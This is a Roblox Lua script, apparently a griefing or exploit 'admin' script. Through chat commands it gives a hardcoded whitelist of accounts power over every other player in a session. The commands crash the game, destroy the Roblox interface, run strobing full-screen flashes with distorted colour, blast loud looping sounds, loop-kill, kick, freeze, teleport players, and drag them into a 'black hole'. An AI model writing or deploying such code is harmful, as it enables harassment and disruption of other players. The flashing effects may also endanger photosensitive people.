local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local TextChatService = game:GetService("TextChatService")
local Debris = game:GetService("Debris")

local teleportDistance = 5
local blackHoleSoundId = 17422207457
local orbitRadius = 20
local orbitSpeed = 50
local loopkillDelay = 0.5
local TimeElapsed = 0
local Intensity = 0

-- Unified Whitelist (for both scripts)
local whitelist = {
	["26Angelcookie26"] = true,
	["hahshsin"] = true,
	["76rgoyf"] = true,
	["ggerrtasalt"] = true,
	["Lokick07"] = true,
	[""] = true,
	["lpina25"] = true,
	["realsticsoccerowner"] = true,
	["Blizz_T"] = true,
	UNDEBOLT = true,
	realsticsoccerowner = true,
	moonyrblxx = true,
	M0onR3b0rn = true,
}

-- Admin Script Variables
local Cam = game.Workspace.Camera
local SoundId = "rbxassetid://89898199435154"


-- Create Fullscreen Black UI (for flash effect)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.DisplayOrder = 12
ScreenGui.Parent = game.CoreGui
ScreenGui.IgnoreGuiInset = true

local BlackFrame = Instance.new("Frame")
BlackFrame.Size = UDim2.new(1, 0, 1, 0)
BlackFrame.Position = UDim2.new(0, 0, 0, 0)
BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
BlackFrame.BackgroundTransparency = 1
BlackFrame.Parent = ScreenGui

-- Variables to track the "s" effects so we can stop them
local colorCorrection  -- Will hold the ColorCorrectionEffect instance
local blr              -- Will hold the BlurEffect instance
local noiseCoroutine1
local noiseCoroutine2
local colorCycleCoroutine

local function flashScreen()
	BlackFrame.BackgroundTransparency = 0
	local tween = TweenService:Create(BlackFrame, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1})
	tween:Play()
end

local function chatMessage(str, player) -- Added player argument
	str = tostring(str)
    --  Local chat only for the command user
    if player and player.Character then
	   if TextChatService.ChatVersion ~= Enum.ChatVersion.LegacyChatService then
            -- TextChatService (Modern) - send to the player's specific channel
             if player.PlayerGui:FindFirstChild("ChatGui") then --Check to see if the player has a ChatGui
                for _, channel in ipairs(TextChatService:GetTextChannels()) do
                    if channel.Name == "RBXSystem" or channel.Name == "RBXGeneral" then --RBXSystem or RBXGeneral should work.
                        TextChatService:SendAsync(channel, str, player.UserId)
                        break -- Exit the loop after sending.
                    end
                end
             end
        else
            -- LegacyChatService
           ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireClient(player, str, "All")
        end
    end
end



local function noise(waitt)
	local Character = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
	local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

	local Sound = Instance.new("Sound")
	Sound.SoundId = SoundId
	Sound.Parent = HumanoidRootPart
	local pitch = 0.7

	while wait(waitt) do
		task.spawn(function()
			task.wait(.01)
			local newsound = Sound:Clone()
			newsound.Parent = workspace
			newsound.Pitch = pitch
			newsound.TimePosition = 0
			newsound:Play()
			flashScreen()
			game:GetService("Debris"):AddItem(newsound, newsound.TimeLength)
			pitch = pitch - 0.01
		end)
	end
end

local function applyEffects()
    -- Only apply these effects if the local player is NOT whitelisted.
    if not whitelist[Players.LocalPlayer.Name] then

	    local msg = Instance.new("Message")
	    msg.Parent = workspace
	    msg.Text = "START RUNNING"
	    task.delay(5, function()
		    msg:Destroy()
	    end)

	    colorCorrection = Instance.new("ColorCorrectionEffect")
	    colorCorrection.Parent = Lighting
	    colorCorrection.Saturation = -500000000
	    colorCorrection.Contrast = 50000
	    colorCorrection.Brightness = 25000
	    Lighting.TimeOfDay = "00:00:00"

	    blr = Instance.new("BlurEffect")
	    blr.Parent = Lighting
	    blr.Size = 1
	    Intensity = 0.03

	    -- Color cycle (cyan, purple, red)
	    local colors = {
		    Color3.fromRGB(0, 255, 255), -- Cyan
		    Color3.fromRGB(128, 0, 128), -- Purple
		    Color3.fromRGB(255, 0, 0)     -- Red
	    }
	    
	    colorCycleCoroutine = task.spawn(function()  -- Store the coroutine
		    local index = 1
		    while task.wait(0.5) do
			    if colorCorrection then -- Check if it still exists
				    colorCorrection.TintColor = colors[index]
			    end
			    index = index % #colors + 1
		    end
	    end)

	    noiseCoroutine1 = task.delay(30, function()  -- Store coroutine
		    noise(1)
	    end)
	    noiseCoroutine2 = task.spawn(function() noise(2) end) -- Store coroutine
    end
end



local function stopEffects()
	Intensity = 0  -- Stop the camera shake

	if colorCorrection then
		colorCorrection:Destroy()
		colorCorrection = nil  -- Important for garbage collection
	end
	if blr then
		blr:Destroy()
		blr = nil
	end
	
	Lighting.TimeOfDay = "12:00:00"  -- Reset time of day (optional, adjust as needed)

	-- Stop the noise coroutines
	if noiseCoroutine1 then
		task.cancel(noiseCoroutine1)
		noiseCoroutine1 = nil
	end
	if noiseCoroutine2 then
		task.cancel(noiseCoroutine2)
		noiseCoroutine2 = nil
	end
   if colorCycleCoroutine then
		task.cancel(colorCycleCoroutine)
		colorCycleCoroutine = nil
	end

	-- Clean up any lingering sounds (important!)
	for _, sound in ipairs(workspace:GetDescendants()) do
		if sound:IsA("Sound") and sound.SoundId == SoundId then
			sound:Stop()
			sound:Destroy()
		end
	end
end
local function showObjects()
    if not whitelist[Players.LocalPlayer.Name] then --Only show for non-whitelisted.
	    for _, obj in pairs(workspace:GetChildren()) do
		    local part = Instance.new("Part")
		    part.Size = Vector3.new(2, 2, 2)
		    part.Position = obj.Position + Vector3.new(math.random(-5, 5), math.random(-5, 5), math.random(-5, 5))
		    part.Anchored = true
		    part.BrickColor = BrickColor.random()
		    part.Material = Enum.Material.Neon
		    part.Parent = workspace
		    task.delay(5, function() part:Destroy() end)
	    end
    end
end

local blackHoles = {}
local isPulling = {}

local function createRainbowTween(blackHole)
	local rainbowColors = {
		Color3.fromRGB(255, 0, 0),
		Color3.fromRGB(255, 165, 0),
		Color3.fromRGB(255, 255, 0),
		Color3.fromRGB(0, 255, 0),
		Color3.fromRGB(0, 0, 255),
		Color3.fromRGB(75, 0, 130),
		Color3.fromRGB(238, 130, 238)
	}
	
	local colorIndex = 1

	local function tweenColor()
		local nextColor = rainbowColors[colorIndex]
		colorIndex = (colorIndex % #rainbowColors) + 1

		local tween = TweenService:Create(
			blackHole,
			TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
			{Color = nextColor}
		)
		tween:Play()
		tween.Completed:Connect(function()
			tweenColor()
		end)
	end

	tweenColor()
end

local function createBlackHole(targetPlayer, requestingPlayer)
    -- Don't create a black hole *on* the requesting player.
    if targetPlayer == requestingPlayer then return end
    if not whitelist[targetPlayer.Name] then  -- Only non-whitelisted players get a black hole.

	    local character = targetPlayer.Character
	    if not character or blackHoles[targetPlayer.Name] then return end


	    local blackHole = Instance.new("Part")
	    blackHole.Size = Vector3.new(25, 25, 25)
	    blackHole.Shape = Enum.PartType.Ball
	    blackHole.Material = Enum.Material.Neon
	    blackHole.Color = Color3.fromRGB(0, 0, 0)
	    blackHole.Anchored = true
	    blackHole.CanCollide = false
	    blackHole.Parent = workspace

	    local aura = Instance.new("ParticleEmitter")
	    aura.Texture = "rbxassetid://1344771186"
	    aura.Lifetime = NumberRange.new(1, 1)
	    aura.Rate = 250
	    aura.Size = NumberSequence.new(1)
	    aura.Speed = NumberRange.new(500, 500)
	    aura.Parent = blackHole

	    blackHoles[targetPlayer.Name] = blackHole
	    isPulling[targetPlayer.Name] = true

	    local sound = Instance.new("Sound")
	    sound.SoundId = "rbxassetid://" .. blackHoleSoundId
	    sound.Looped = true
	    sound.Parent = SoundService  -- Put in SoundService so all hear.
	    sound:Play()

	    createRainbowTween(blackHole)

	    local angle = 0
	    RunService.Heartbeat:Connect(function()
		    if isPulling[targetPlayer.Name] and blackHoles[targetPlayer.Name] then
			    local hrp = character:FindFirstChild("HumanoidRootPart")
			    if hrp then
				    angle = angle + orbitSpeed * RunService.Heartbeat:Wait()
				    local offset = Vector3.new(math.cos(angle) * orbitRadius, 0, math.sin(angle) * orbitRadius)
				    blackHole.Position = hrp.Position + offset

				    for _, p in pairs(Players:GetPlayers()) do
					    -- Check whitelist before applying the pull effect
					    if not whitelist[p.Name] then
						    if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
							    local distance = (p.Character.HumanoidRootPart.Position - blackHole.Position).magnitude
							    if distance < 100 then
								    local force = Instance.new("BodyPosition")
								    force.MaxForce = Vector3.new(1e9, 1e9, 1e9)
								    force.Position = blackHole.Position
								    force.Parent = p.Character.HumanoidRootPart
								    task.wait(0.5)
								    force:Destroy()
							    end
						    end
					    end
				    end
			    end
		    end
	    end)
    end
end
local function removeBlackHole(targetPlayer)
	if blackHoles[targetPlayer.Name] then
		local blackHole = blackHoles[targetPlayer.Name]
		blackHole:Destroy()
		blackHoles[targetPlayer.Name] = nil
		isPulling[targetPlayer.Name] = false

		for _, sound in pairs(SoundService:GetChildren()) do
			if sound:IsA("Sound") and sound.SoundId == "rbxassetid://" .. blackHoleSoundId then
				sound:Stop()
				sound:Destroy()
			end
		end
	end
end

-- Sound ID for spam
local spamSoundId = "rbxassetid://8046889679"
local soundObjects = {} 
local isSpamming = false 
local spamLoop 

local function spamAll()
	if isSpamming then return end
	isSpamming = true

	spamLoop = coroutine.create(function()
		while isSpamming do
			for _, player in ipairs(Players:GetPlayers()) do
                if not whitelist[player.Name] then -- Only spam non-whitelisted players.
					local character = player.Character
					if character and character:FindFirstChild("HumanoidRootPart") then
						for i = 1, 10 do 
							local sound = Instance.new("Sound")
							sound.SoundId = spamSoundId
							sound.Looped = false
							sound.Pitch = math.random(200, 200) / 200 
							sound.Volume = 22
							sound.Parent = character.HumanoidRootPart
							sound:Play()
							table.insert(soundObjects, sound)
						end
					end
				end
			end
			wait(4)
		end
	end)
	coroutine.resume(spamLoop)
end

local function unspamAll()
	if not isSpamming then return end
	isSpamming = false

	for _, sound in ipairs(soundObjects) do
		if sound then
			sound:Stop()
			sound:Destroy()
		end
	end
	soundObjects = {} 
end

local function teleportPlayer(playerToTeleport, targetPlayer)
	-- Whitelist check for teleportation
    if whitelist[playerToTeleport.Name] or playerToTeleport.Name == targetPlayer.Name then return end
	local character = targetPlayer.Character
	if character and character:FindFirstChild("HumanoidRootPart") then
		local hrp = character.HumanoidRootPart
		local teleportPosition = hrp.Position + hrp.CFrame.LookVector * teleportDistance
		playerToTeleport.Character:SetPrimaryPartCFrame(CFrame.new(teleportPosition))
	end
end

local function freezePlayer(player)
	-- Whitelist check for freeze
    if whitelist[player.Name] then return end
	local character = player.Character
	if character then
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart then
			humanoidRootPart.Anchored = true
		end
	end
end

local function unfreezePlayer(player)
	-- Whitelist check for unfreeze (though generally you'd want admins to be able to unfreeze)
    if whitelist[player.Name] then return end
	local character = player.Character
	if character then
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart then
			humanoidRootPart.Anchored = false
		end
	end
end


local function killPlayer(player)
	-- Whitelist check for kill
    if not whitelist[player.Name] then
	    local character = player.Character
	    if character and character:FindFirstChild("Humanoid") then
		    character.Humanoid.Health = 0
	    end
    end
end

local loopKillPlayers = {}

local function loopKill(player)
     --Whitelist check for loopkill
     if not whitelist[player.Name] then
		loopKillPlayers[player.Name] = true -- Set to true *before* the loop
		while loopKillPlayers[player.Name] do
			killPlayer(player)
			wait(loopkillDelay)
		end
     end
end
local function unloopKill(player)
	-- Corrected unloopKill function
	loopKillPlayers[player.Name] = false
end

local function onChatted(player, message)
    -- Assuming 'whitelist' is defined elsewhere (e.g., at the top of your script)
    if not whitelist[player.Name] then return end  -- Early exit if not whitelisted

    local command = message:lower()

    if command == "!crash" then
        print("!crash command executed by: " .. player.Name)
        while true do end
    elseif command:sub(1, 4) == "!say" then
        local text = message:sub(6)
        print("!say command executed by: " .. player.Name .. ", Message: " .. text)
        chatMessage(text, player) -- You'll need the chatMessage function from before
    elseif command == "!kill" then
        print("!kill command executed by: " .. player.Name)
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.Health = 0
        end
    elseif command == "!s" then
         print("!s command executed by: " .. player.Name)
        pcall(function()
            game:GetService("CoreGui").RobloxGui:Destroy()
        end)
        applyEffects() -- You need the applyEffects function
    elseif command == "!uns" then
        print("!uns command executed by: " .. player.Name)
        stopEffects() -- You need the stopEffects function
    elseif command == "!objects" then
        print("!objects command executed by: " .. player.Name)
        showObjects() -- You need the showObjects function
    elseif command == "!spam all" then
         print("!spam all command executed by: " .. player.Name)
        spamAll() -- You need the spamAll function
    elseif command == "!unspam all" then
        print("!unspam all command executed by: " .. player.Name)
        unspamAll() -- You need the unspamAll function
    elseif command == "!kick all" then
        print("!kick all command executed by: " .. player.Name)
        for _, p in ipairs(Players:GetPlayers()) do
            if not whitelist[p.Name] then
                p:Kick("You have been kicked by Owner/Admin player.")
            end
        end
    elseif command == "!loopkill all" then
        print("!loopkill all command executed by: " .. player.Name)
        for _, p in ipairs(Players:GetPlayers()) do
            loopKill(p)
        end
    elseif command == "!unloopkill all" then
        print("!unloopkill all command executed by: " .. player.Name)
        for _, p in ipairs(Players:GetPlayers()) do
            unloopKill(p)
        end
    elseif command == "!blackhole all" then
        print("!blackhole all command executed by: " .. player.Name)
        for _, p in ipairs(Players:GetPlayers()) do
            createBlackHole(p, player)  -- Pass requesting player
        end
    elseif command == "!unblackhole all" then
        print("!unblackhole all command executed by: " .. player.Name)
        for _, p in ipairs(Players:GetPlayers()) do
            removeBlackHole(p)
        end
    elseif command:match("^!bring all") then
        print("!bring all command executed by: " .. player.Name)
        for _, p in pairs(Players:GetPlayers()) do
            teleportPlayer(p, player)
        end
    elseif command == "!freeze all" then
        print("!freeze all command executed by: " .. player.Name)
        for _, p in pairs(Players:GetPlayers()) do
            freezePlayer(p)
        end
    elseif command == "!unfreeze all" then
        print("!unfreeze all command executed by: " .. player.Name)
        for _, p in pairs(Players:GetPlayers()) do
            unfreezePlayer(p)
        end
    elseif command == "!kill all" then
        print("!kill all command executed by: " .. player.Name)
        for _, p in pairs(Players:GetPlayers()) do
            killPlayer(p)
        end
    elseif command:sub(1, 9) == "!chat all " then
        local chatMessageText = command:sub(10)
        print("!chat all command executed by: " .. player.Name .. ", Message: " .. chatMessageText)
        if chatMessageText and chatMessageText ~= "" then
            chatMessage(chatMessageText, player)  -- Pass player
        end
    end
end

-- Connect event handlers (VERY IMPORTANT)

-- Handle players who are already in the game
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        onChatted(player, message)
    end)
end

-- Handle players who join later
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        onChatted(player, message)
    end)
end)
